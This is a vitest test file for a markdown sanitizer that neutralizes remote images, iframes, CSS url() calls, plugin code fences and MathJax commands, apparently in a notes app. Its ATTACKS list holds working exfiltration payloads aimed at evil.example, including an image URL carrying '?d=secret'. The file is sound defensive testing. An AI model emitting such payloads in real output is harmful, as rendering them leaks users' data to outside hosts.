import { describe, expect, it } from 'vitest';
import { marked } from 'marked';
import {
  ZWSP,
  neutralizeRemoteMedia,
  restoreRemoteMedia,
} from './remote-media';

function decode(v: string): string {
  return v
    .replace(/&#x([0-9a-f]+);/gi, (_m, h) => String.fromCodePoint(parseInt(h, 16)))
    .replace(/&#(\d+);/g, (_m, d) => String.fromCodePoint(Number(d)))
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&amp;/g, '&');
}

/**
 * Every element in rendered HTML, other than a link, that carries a
 * remote URL in an attribute: the things a browser would fetch on
 * render. A CommonMark parser is the oracle, so these tests prove what
 * the text becomes, not what the neutralizer meant to do.
 */
function remoteLoads(md: string): string[] {
  const html = marked.parse(md, { async: false });
  const hits: string[] = [];
  for (const tag of html.matchAll(/<([a-z][\w-]*)\b([^>]*)>/gi)) {
    if (tag[1].toLowerCase() === 'a') continue;
    for (const attr of tag[2].matchAll(
      /([\w:-]+)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/g,
    )) {
      const value = decode(attr[2] ?? attr[3] ?? attr[4] ?? '');
      if (/(?:https?:)?[/\\]{2}/i.test(value) || /url\s*\(/i.test(value)) {
        hits.push(tag[0]);
      }
    }
  }
  return hits;
}

const ATTACKS: Array<[string, string]> = [
  ['inline image', 'Done. ![](https://evil.example/p?d=secret)'],
  ['image with title', '![x](https://evil.example/p "t")'],
  ['pointy destination', '![x](<https://evil.example/p>)'],
  ['protocol-relative', '![x](//evil.example/p)'],
  ['uppercase scheme', '![x](HTTPS://evil.example/p)'],
  ['entity in scheme', '![x](h&#116;tps://evil.example/p)'],
  ['entity for the scheme colon', '![a](https&#58;//e.x/p)'],
  ['line break before target', '![x](\nhttps://evil.example/p)'],
  ['brackets in alt', '![a [b] c](https://evil.example/p)'],
  ['bracketed alt that looks like an embed', '![[a]](https://evil.example/p)'],
  ['code span in alt', '![`x](a.png) y`](https://evil.example/p)'],
  ['image inside a link', '[![x](https://evil.example/i.png)](https://example.com)'],
  ['image in a quote', '> ![x](https://evil.example/p)'],
  ['image in a list', '- item\n  - ![x](https://evil.example/p)'],
  ['full reference', '![x][r]\n\n[r]: https://evil.example/p'],
  ['shortcut reference', '![r]\n\n[r]: https://evil.example/p'],
  ['raw img', 'ok <img src="https://evil.example/p">'],
  ['raw img, odd case', '<IMG SRC=//evil.example/p>'],
  ['raw iframe', '<iframe src="https://evil.example/p"></iframe>'],
  ['video poster', '<video poster="https://evil.example/p"></video>'],
  ['css url', '<span style="background:url(https://evil.example/p)">x</span>'],
  ['svg image', '<svg><image href="https://evil.example/p"/></svg>'],
  ['html block', '<div>\n<img src="https://evil.example/p">\n</div>'],
  ['comment block', '<!--\n-->\n<img src="https://evil.example/p">'],
  [
    'fence closed by a list-item fence',
    '1. ```\n   ```\n<img src="https://evil.example/p">\n```',
  ],
];

describe('neutralizeRemoteMedia: no remote load survives rendering', () => {
  it.each(ATTACKS)('%s is a real load before neutralizing', (_l, md) => {
    expect(remoteLoads(md)).not.toEqual([]);
  });

  it.each(ATTACKS)('%s renders with no remote load after', (_l, md) => {
    expect(remoteLoads(neutralizeRemoteMedia(md))).toEqual([]);
  });

  it('a wikilink embed of a URL is not kept as an embed', () => {
    expect(neutralizeRemoteMedia('![[https://evil.example/p.png]]')).toBe(
      `!${ZWSP}[[https://evil.example/p.png]]`,
    );
  });

  it('a remote image becomes a plain link to the same URL', () => {
    const html = marked.parse(
      neutralizeRemoteMedia('![chart](https://example.com/c.png)'),
      { async: false },
    );
    expect(html).toContain('<a href="https://example.com/c.png">chart</a>');
    expect(html).not.toContain('<img');
  });
});

/** Language classes and code-span texts a plugin's processor would see. */
function rendererInputs(md: string): string[] {
  const html = marked.parse(md, { async: false });
  return [
    ...[...html.matchAll(/class="language-([^"]*)"/g)].map((m) => m[1]),
    ...[...html.matchAll(/<code>([^<]*)<\/code>/g)].map((m) => decode(m[1]).trim()),
  ];
}

const PROCESSED: Array<[string, string, RegExp]> = [
  ['mermaid fence', '```mermaid\nflowchart TD\n  A@{ img: "https://evil.example/p" }\n```', /^mermaid$/],
  ['tilde fence, odd case', '~~~ MerMaid\nflowchart TD\n~~~', /^mermaid$/i],
  ['fence in a quote', '> ```dataviewjs\n> dv.el("img", "")\n> ```', /^dataviewjs$/],
  ['plugin fence', '````chart\ntype: bar\n````', /^chart$/],
  ['inline dataview js', 'see `$= dv.el("img", "")` here', /^\$?=/],
  ['inline dataview', 'see `= this.file.name` here', /^\$?=/],
];

describe('neutralizeRemoteMedia: code reaches no renderer but plain code', () => {
  it.each(PROCESSED)('%s reaches a processor before neutralizing', (_l, md, hit) => {
    expect(rendererInputs(md).some((x) => hit.test(x))).toBe(true);
  });

  it.each(PROCESSED)('%s does not after', (_l, md, hit) => {
    expect(rendererInputs(neutralizeRemoteMedia(md)).some((x) => hit.test(x))).toBe(false);
  });

  it.each([
    ['style', '$\\style{background-image:url(https://evil.example/p)}{x}$'],
    ['class', '$$\\class{a}{x}$$'],
    ['cssId', '$\\cssId{a}{x}$'],
    ['require', '$\\require{https://evil.example/m.js}$'],
  ])('math \\%s is broken', (_l, md) => {
    expect(neutralizeRemoteMedia(md)).not.toMatch(/\\(?:style|class|cssId|require)(?![A-Za-z])/);
  });

  it.each([
    ['highlighted fence', '```ts\nconst a = 1;\n```'],
    ['bare fence', '```\nplain\n```'],
    ['math', '$\\frac{a}{b} \\styles$'],
    ['inline code', 'run `pnpm test` now'],
  ])('%s is untouched', (_l, md) => {
    expect(neutralizeRemoteMedia(md)).toBe(md);
  });
});

describe('neutralizeRemoteMedia: vault content is untouched', () => {
  it.each([
    ['wikilink embed', '![[photo.png]]'],
    ['embed with heading and alias', '![[Projects/plan#Next steps|plan]]'],
    ['embed with size', '![[photo.png|300]]'],
    ['local image', '![diagram](attachments/garden.png)'],
    ['autolink', 'See <https://example.com/docs>.'],
    ['plain prose', 'Use a < b and 3 > 2. Wow!'],
  ])('%s', (_l, md) => {
    expect(neutralizeRemoteMedia(md)).toBe(md);
  });

  it('a local image still renders as an image', () => {
    const html = marked.parse(
      neutralizeRemoteMedia('![d](attachments/garden.png)'),
      { async: false },
    );
    expect(html).toContain('<img src="attachments/garden.png" alt="d">');
  });

  it('code reads the same once the invisible mark is ignored', () => {
    const md = '```html\n<img src="https://example.com/a.png">\n```\nand `<div>`';
    const out = neutralizeRemoteMedia(md);
    expect(out).not.toBe(md);
    expect(out.split(ZWSP).join('')).toBe(md);
  });
});

describe('neutralizeRemoteMedia: idempotent and reversible', () => {
  const sample =
    'Hi ![x](https://evil.example/p) <img src=//e> ![[a.png]] <https://ok.example>' +
    '\n```mermaid\nA\n```\n`$= x` $\\style{a}{b}$';

  it('is idempotent', () => {
    const once = neutralizeRemoteMedia(sample);
    expect(neutralizeRemoteMedia(once)).toBe(once);
  });

  it('restoreRemoteMedia gives back the original text', () => {
    expect(restoreRemoteMedia(neutralizeRemoteMedia(sample))).toBe(sample);
  });
});
